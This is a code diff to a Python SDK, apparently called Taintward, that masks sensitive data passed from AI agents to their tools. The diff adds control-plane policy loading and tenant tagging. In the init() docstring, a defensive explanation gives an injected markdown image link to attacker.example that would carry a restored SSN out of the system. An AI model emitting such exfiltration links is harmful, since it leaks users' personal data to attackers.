@@ -44,63 +44,24 @@ adapters only translate each framework's call shape into that one gate.
 from __future__ import annotations
 
 import contextlib
-from dataclasses import dataclass
+import os
 from typing import Any, Iterator, Mapping
 
 from opentelemetry import trace
 
 from taintward.sdk import instrumentation as instr
 from taintward.sdk import placeholders as ph
-from taintward.sdk.destinations import (
+from taintward.sdk.destinations import (  # noqa: F401 - re-exported, part of the API
+    DEFAULT_DESTINATION,
     DEST_EXTERNAL,
     DEST_INTERNAL,
     DEST_LLM,
     DEST_LOG,
     DEST_RAG,
+    VALID_DESTINATIONS,
+    ToolPolicy,
+    _to_policy,
 )
-
-VALID_DESTINATIONS = frozenset({DEST_INTERNAL, DEST_EXTERNAL, DEST_LLM, DEST_LOG, DEST_RAG})
-
-# Safe default for tools that are not in the map. See module docstring.
-DEFAULT_DESTINATION = DEST_EXTERNAL
-
-
-@dataclass(frozen=True)
-class ToolPolicy:
-    """Where one tool sends its input."""
-
-    destination: str = DEFAULT_DESTINATION
-    jurisdiction: str = ""
-    # Argument names passed to the tool unredacted, e.g. the recipient address
-    # of an email tool. An explicit, reviewed exception: the values are still
-    # scanned, so the taint label and the violation flag stay correct.
-    allow: frozenset[str] = frozenset()
-
-    def __post_init__(self) -> None:
-        object.__setattr__(self, "allow", frozenset(self.allow))
-        if self.destination not in VALID_DESTINATIONS:
-            raise ValueError(
-                f"unknown destination {self.destination!r}; "
-                f"use one of {sorted(VALID_DESTINATIONS)}"
-            )
-
-
-def _to_policy(value: Any) -> ToolPolicy:
-    """Accept "external", ("external", "eu"), {"destination": .., "jurisdiction":
-    .., "allow": [..]}, or a ToolPolicy."""
-    if isinstance(value, ToolPolicy):
-        return value
-    if isinstance(value, str):
-        return ToolPolicy(value)
-    if isinstance(value, (tuple, list)) and 1 <= len(value) <= 2:
-        return ToolPolicy(*value)
-    if isinstance(value, Mapping):
-        return ToolPolicy(
-            destination=value.get("destination", DEFAULT_DESTINATION),
-            jurisdiction=value.get("jurisdiction", ""),
-            allow=frozenset(value.get("allow", ())),
-        )
-    raise TypeError(f"cannot read a tool policy from {value!r}")
 
 
 class Ward:
@@ -138,6 +99,21 @@ class Ward:
         # Restore placeholders inside link and image addresses too (gap G1).
         # None: TAINTWARD_RESTORE_IN_URLS, default off.
         self.placeholder_restore_in_urls = placeholder_restore_in_urls
+
+    # Set by taintward.sdk.control.ward_from_control.
+    policy_version: int | None = None
+    control: Any = None
+
+    def apply_policy(self, policy: Mapping[str, Any]) -> None:
+        """Replace the tool map and defaults with a control plane policy
+        document ({"destinations", "default_destination", ...}). The new
+        map is built first, so a bad document raises and leaves the current
+        policy in place."""
+        default = ToolPolicy(policy.get("default_destination") or DEFAULT_DESTINATION,
+                             policy.get("default_jurisdiction") or "")
+        policies = {name: _to_policy(v) for name, v in (policy.get("destinations") or {}).items()}
+        self.policies, self.default = policies, default
+        self.llm_jurisdiction = policy.get("llm_jurisdiction") or ""
 
     def policy_for(self, tool_name: str) -> ToolPolicy:
         return self.policies.get(tool_name, self.default)
@@ -301,7 +277,6 @@ class Ward:
         """Mask ``value`` (text, or a JSON-like payload) for the ``rag``
         destination, for a pipeline with no adapter (your own vector store
         writes)."""
-        from taintward.sdk.destinations import DEST_RAG
         from taintward.sdk.redact import redact_payload
         return redact_payload(value, DEST_RAG)
 
@@ -325,6 +300,8 @@ def init(
     placeholder_instruction: bool = True,
     placeholder_strict: bool = False,
     placeholder_restore_in_urls: bool | None = None,
+    tenant: str | None = None,
+    control: bool | None = None,
 ) -> Ward:
     """Configure Taintward once per process and return the global ``Ward``.
 
@@ -355,17 +332,30 @@ def init(
       and image addresses. Off, an injected
       ``![x](https://attacker.example/?d=<SSN_1>)`` keeps the placeholder
       instead of carrying the real value out (gap G1).
+    * ``tenant`` (default TAINTWARD_TENANT): recorded as ``taintward.tenant``
+      on every span.
+    * ``control`` (default: on when TAINTWARD_CONTROL_URL is set): take the
+      tool map and defaults from the control plane (``taintward.sdk.control``,
+      kept current with TAINTWARD_CONTROL_REFRESH_SECONDS) and, unless
+      ``endpoint`` is given, send spans to it. Then pass no ``destinations``.
     """
     global _GLOBAL
+    if control is None:
+        control = bool(os.environ.get("TAINTWARD_CONTROL_URL", "").strip())
+    if control and destinations:
+        raise ValueError("with the control plane the tool map comes from it; "
+                         "pass no destinations (or control=False)")
+    headers = None
+    if control and endpoint is None:
+        from taintward.sdk.control import ControlClient
+        c = ControlClient()
+        endpoint, headers = c.url + "/v1/traces", {"Authorization": f"Bearer {c.token}"}
     if tracer is None:
         tracer = instr.configure_tracing(
             service_name, endpoint=endpoint or instr.DEFAULT_OTLP_HTTP, console=console,
+            tenant=tenant, headers=headers,
         )
-    _GLOBAL = Ward(
-        destinations,
-        default_destination=default_destination,
-        default_jurisdiction=default_jurisdiction,
-        llm_jurisdiction=llm_jurisdiction,
+    options = dict(
         tracer=tracer,
         placeholders=placeholders,
         placeholder_vault=placeholder_vault,
@@ -373,6 +363,17 @@ def init(
         placeholder_instruction=placeholder_instruction,
         placeholder_strict=placeholder_strict,
         placeholder_restore_in_urls=placeholder_restore_in_urls,
+    )
+    if control:
+        from taintward.sdk.control import ward_from_control
+        _GLOBAL = ward_from_control(**options)
+        return _GLOBAL
+    _GLOBAL = Ward(
+        destinations,
+        default_destination=default_destination,
+        default_jurisdiction=default_jurisdiction,
+        llm_jurisdiction=llm_jurisdiction,
+        **options,
     )
     return _GLOBAL
 
